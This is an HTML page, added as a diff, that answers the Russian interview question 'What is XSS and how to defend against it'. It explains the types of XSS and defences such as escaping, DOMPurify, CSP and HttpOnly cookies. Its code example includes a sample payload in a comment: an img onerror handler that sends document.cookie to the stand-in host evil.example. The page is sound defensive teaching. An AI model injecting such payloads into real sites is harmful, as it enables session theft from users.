@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Что такое XSS и как от неё защищаться? — вопрос с собеседования</title>
+<meta name="description" content="XSS — злоумышленник заставляет сайт выполнить его JavaScript в браузере другого пользователя: скрипт работает с правами сайта — читает данные…">
+<link rel="canonical" href="https://learn.getsotto.ru/questions/cs/xss/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Учебная платформа">
+<meta property="og:locale" content="ru_RU">
+<meta property="og:url" content="https://learn.getsotto.ru/questions/cs/xss/">
+<meta property="og:title" content="Что такое XSS и как от неё защищаться? — вопрос с собеседования">
+<meta property="og:description" content="XSS — злоумышленник заставляет сайт выполнить его JavaScript в браузере другого пользователя: скрипт работает с правами сайта — читает данные…">
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/learn.css">
+</head>
+<body>
+<header class="top"><div class="wrap">
+  <a class="logo" href="/"><svg class="mark" viewBox="0 0 32 32" width="28" height="28" aria-hidden="true"><rect width="32" height="32" rx="8" fill="#9676ff"/><path d="M7 24h6v-5h6v-5h6V8" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>Учебная платформа</a>
+  <nav class="nav"><a href="/roadmap/">Карты профессий</a><a href="/questions/">Вопросы</a><a href="/articles/">Статьи</a></nav>
+</div></header>
+<main>
+<link rel="stylesheet" href="/assets/bank.css">
+<section class="bank card-page"><div class="wrap narrow">
+  <nav class="crumbs"><a href="/questions/">Вопросы</a> <span>/</span> <a href="/questions/cs/">Основы</a> <span>/</span> <span>Что такое XSS и как от неё защищаться?</span></nav><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Вопросы","item":"https://learn.getsotto.ru/questions/"},{"@type":"ListItem","position":2,"name":"Основы","item":"https://learn.getsotto.ru/questions/cs/"},{"@type":"ListItem","position":3,"name":"Что такое XSS и как от неё защищаться?"}]}</script>
+  <h1>Что такое XSS и как от неё защищаться?</h1>
+  <div class="chips"><span class="lvl lvl-junior">Junior</span><span class="chip">Безопасность</span></div>
+  <div class="aliases"><span>Ещё спрашивают так:</span><ul><li>Что такое межсайтовый скриптинг?</li><li>Зачем cookie флаг HttpOnly?</li><li>Что такое Content Security Policy?</li></ul></div>
+  <div class="short"><span class="label">Коротко</span><p class="main">XSS — злоумышленник заставляет сайт выполнить <b>его JavaScript в браузере другого пользователя</b>: скрипт работает с правами сайта — читает данные страницы, отправляет запросы от имени жертвы.</p><ul><li>Хранимая — скрипт сохранён в базе (комментарий, имя профиля); отражённая — пришёл в параметре ссылки; DOM-XSS — внедрён клиентским кодом</li><li>Главная защита — экранирование вывода по контексту; фреймворки делают это по умолчанию</li><li>Опасные места: innerHTML, dangerouslySetInnerHTML, v-html, вставка в URL и атрибуты</li></ul><p class="extra"><span>А ещё</span> Защита в глубину: CSP, cookie с HttpOnly, санитайзер для разрешённого HTML</p></div>
+  
+  <section class="block"><h2>Подробно</h2><div class="md"><p>Браузер не различает «скрипт сайта» и «скрипт, который сайт по ошибке вставил из пользовательских данных». Если в имя пользователя записать <code>&lt;script&gt;…&lt;/script&gt;</code>, а страница выведет имя как HTML, скрипт выполнится у всех, кто откроет страницу.</p>
+<p><b>Виды:</b></p>
+<ul><li><b>хранимая</b> — вредный ввод сохраняется на сервере и показывается другим: комментарии, отзывы, сообщения в поддержку, названия файлов;</li><li><b>отражённая</b> — вредные данные в ссылке (<code>?q=&lt;script&gt;…</code>), сервер вставляет их в ответ; жертву заманивают по ссылке;</li><li><b>DOM-based</b> — уязвим клиентский код: <code>element.innerHTML = location.hash</code>.</li></ul>
+<p><b>Что может скрипт:</b> читать содержимое страницы и токены из <code>localStorage</code>, делать запросы к API от имени пользователя (с его cookie), подменять формы и выманивать пароль, майнить, распространяться дальше (червь в соцсети).</p>
+<p><b>Защита:</b></p>
+<ul><li><b>экранирование при выводе</b> с учётом контекста: в HTML-тексте <code>&lt;</code> → <code>&amp;lt;</code>; в атрибуте — кавычки; в JavaScript — свои правила; в URL — запрет <code>javascript:</code>. Шаблонизаторы (Jinja2, Thymeleaf) и фреймворки (React, Vue, Angular) экранируют по умолчанию — опасно именно отключение: <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>|safe</code>, <code>innerHTML</code>;</li><li>если нужно разрешить HTML (редактор статей) — <b>санитайзер</b> со списком разрешённых тегов и атрибутов (DOMPurify), а не самописные регулярки;</li><li><b>Content Security Policy</b> — заголовок, который запрещает инлайн-скрипты и загрузку скриптов с чужих доменов: даже внедрённый тег не выполнится;</li><li>**cookie с <code>HttpOnly</code>** — скрипт не прочитает сессионную cookie (но запросы от имени пользователя сделать всё равно сможет);</li><li>не хранить токены в <code>localStorage</code>, если можно в HttpOnly-cookie;</li><li><code>Content-Type</code> и <code>X-Content-Type-Options: nosniff</code> для отдаваемых файлов.</li></ul>
+<p>Валидация ввода полезна, но не заменяет экранирование вывода: одни и те же данные выводятся в разные контексты.</p></div></section><section class="block"><h2>Пример</h2><div class="md"><pre class="lang-javascript"><code>// уязвимо: имя пользователя из API вставляется как HTML
+card.innerHTML = `&lt;b&gt;${user.name}&lt;/b&gt;`;
+// user.name = &#x27;&lt;img src=x onerror=&quot;fetch(`//evil.example/?c=${document.cookie}`)&quot;&gt;&#x27;
+
+// безопасно: текст, а не разметка
+const b = document.createElement(&quot;b&quot;);
+b.textContent = user.name;
+card.append(b);</code></pre></div></section><section class="block expect"><h2>Что хотят услышать</h2><div class="md"><ul><li>Суть: чужой скрипт выполняется в контексте сайта у другого пользователя.</li><li>Виды: хранимая, отражённая, DOM.</li><li>Экранирование по контексту как главная защита, опасные API фреймворков.</li><li>CSP и HttpOnly как дополнительные слои.</li></ul></div></section><section class="block mistakes"><h2>Частые ошибки</h2><div class="md"><ul><li>Защищаться только фильтрацией слова <code>&lt;script&gt;</code> на входе.</li><li>Считать, что HttpOnly полностью защищает от последствий XSS.</li></ul></div></section>
+  
+  <section class="block next"><h2>Что спросят дальше</h2><ul class="links"><li><a href="/questions/cs/csrf-cors/">Что такое CSRF и как он связан с CORS?</a> <span class="lvl lvl-middle">Middle</span></li></ul></section>
+  
+  <section class="block"><h2>Связанные вопросы</h2><ul class="links"><li><a href="/questions/cs/sql-injection/">Что такое SQL-инъекция и как от неё защититься?</a> <span class="lvl lvl-junior">Junior</span></li><li><a href="/questions/system-design/secure-public-api/">Какие меры безопасности вы заложите при проектировании публичного REST API с личным кабинетом пользователя?</a> <span class="lvl lvl-middle">Middle</span></li></ul></section>
+</div></section>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Что такое XSS и как от неё защищаться?","acceptedAnswer":{"@type":"Answer","text":"XSS — злоумышленник заставляет сайт выполнить его JavaScript в браузере другого пользователя: скрипт работает с правами сайта — читает данные страницы, отправляет запросы от имени жертвы. Хранимая — скрипт сохранён в базе (комментарий, имя профиля); отражённая — пришёл в параметре ссылки; DOM-XSS — внедрён клиентским кодом Главная защита — экранирование вывода по контексту; фреймворки делают это по умолчанию Опасные места: innerHTML, dangerouslySetInnerHTML, v-html, вставка в URL и атрибуты Защита в глубину: CSP, cookie с HttpOnly, санитайзер для разрешённого HTML Браузер не различает «скрипт сайта» и «скрипт, который сайт по ошибке вставил из пользовательских данных». Если в имя пользователя записать <script>…<\/script>, а страница выведет имя как HTML, скрипт выполнится у всех, кто откроет страницу. Виды: - хранимая — вредный ввод сохраняется на сервере и показывается другим: комментарии, отзывы, сообщения в поддержку, названия файлов; - отражённая — вредные данные в ссылке (?q=<script>…), сервер вставляет их в ответ; жертву заманивают по ссылке; - DOM-based — уязвим клиентский код: element.innerHTML = location.hash. Что может скрипт: читать содержимое страницы и токены из localStorage, делать запросы к API от имени пользователя (с его cookie), подменять формы и выманивать пароль, майнить, распространяться дальше (червь в соцсети). Защита: - экранирование при выводе с учётом контекста: в HTML-тексте < → &lt;; в атрибуте — кавычки; в JavaScript …"}}]}</script>
+<section class="partner"><div class="wrap">
+  <div>
+    <span class="kicker">Партнёр платформы</span>
+    <h2>sotto — ассистент для живых разговоров</h2>
+    <p>Помогает вести занятия, лекции и рабочие созвоны: на одном экране показывает подсказки по материалу, которые не видит аудитория, и помогает точнее отвечать на вопросы.</p>
+  </div>
+  <a class="btn primary" href="https://getsotto.ru/?utm_source=learn&amp;utm_medium=partner" rel="noopener">Узнать о sotto</a>
+</div></section>
+</main>
+<footer><div class="wrap">
+  <div><a class="logo" href="/"><svg class="mark" viewBox="0 0 32 32" width="28" height="28" aria-hidden="true"><rect width="32" height="32" rx="8" fill="#9676ff"/><path d="M7 24h6v-5h6v-5h6V8" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>Учебная платформа</a>
+    <p style="margin-top:12px">Карты профессий, статьи и вопросы с собеседований — бесплатно и в открытом доступе.</p></div>
+  <div><h4>Разделы</h4><ul><li><a href="/roadmap/">Карты профессий</a></li><li><a href="/questions/">Вопросы</a></li><li><a href="/articles/">Статьи</a></li></ul></div>
+  <div><h4>Партнёр</h4><ul><li><a href="https://getsotto.ru/?utm_source=learn&amp;utm_medium=footer" rel="noopener">sotto — ассистент для живых разговоров</a></li></ul></div>
+</div></footer>
+</body>
+</html>
